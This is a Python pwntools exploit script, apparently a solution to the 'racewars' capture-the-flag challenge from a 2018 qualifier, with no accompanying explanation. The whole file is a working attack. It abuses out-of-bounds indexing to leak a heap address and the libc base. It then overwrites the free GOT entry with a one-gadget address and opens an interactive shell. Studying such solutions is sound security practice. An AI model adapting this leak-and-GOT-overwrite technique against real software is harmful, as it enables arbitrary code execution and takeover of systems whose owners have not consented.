from pwn import *

def menu(p):
	p.recvuntil('CHOICE: ')

def chassis(p):
	menu(p)
	p.sendline('2')
	p.sendline('1')

def engine(p):
	menu(p)
	p.sendline('3')

def speed(p):
	menu(p)
	p.sendline('4')
	p.recvuntil('? ')
	p.sendline('0')

def tires(p, num):
	menu(p)
	p.sendline('1')
	p.sendline(str(num))

def m_tires(p, c, v):
	menu(p)
	p.sendline('1')
	menu(p)
	p.sendline(str(c))
	p.recvuntil(': ')
	p.sendline(str(v))

p = process('./racewars')
# p = remote('2f76febe.quals2018.oooverflow.io', 31337)
# print p.recvuntil('Solution:')
# sol = raw_input()
# p.sendline(sol)

tires(p, 0x20000000)
speed(p)
chassis(p)
engine(p)

# go into modify
m_tires(p, '1', '-1')
m_tires(p, '2', '-1')
m_tires(p, '3', '-1')
m_tires(p, '4', '-1')

# leak heap
cc = ''
for x in range(0x17, 0x17 + 8):
	menu(p)
	p.sendline('4')
	p.recvuntil('? ')
	p.sendline(str(x + 1))
	p.recvuntil(' is ')
	c = '%02x' % (int(p.recvuntil(',', drop=True)))
	cc += c
	p.sendline('0')
	p.sendline('0')
heap_addr = u64(cc.decode('hex'))
buffer_base = heap_addr - 0x10
print 'buffer base: %s' % hex(buffer_base)

puts_got = 0x603020
distance = buffer_base - puts_got
print hex(distance)
# leak libc
cc = ''
for x in xrange(distance, distance - 8, -1):
	menu(p)
	p.sendline('4')
	p.recvuntil('? ')
	p.sendline(str(0x10000000000000000 - x))
	p.recvuntil(' is ')
	c = '%02x' % (int(p.recvuntil(',', drop=True)))
	cc += c
	p.sendline('0')
	p.sendline('0')
puts_addr = u64(cc.decode('hex'))
print 'puts: %s' % hex(puts_addr)
libc_base = puts_addr - 0x6f690
system = libc_base + 0x4526a
# system = 0x4141414141414141

system_str = p64(system)
t = 0
free_got = 0x603018
distance = buffer_base - free_got
for x in xrange(distance, distance - 8, -1):
	menu(p)
	p.sendline('4')
	p.recvuntil('? ')
	p.sendline(str(0x10000000000000000 - x))
	p.recvuntil(' is ')
	p.sendline(str(ord(system_str[t])))
	p.sendline('1')
	t += 1

menu(p)
p.sendline('6')

p.interactive()

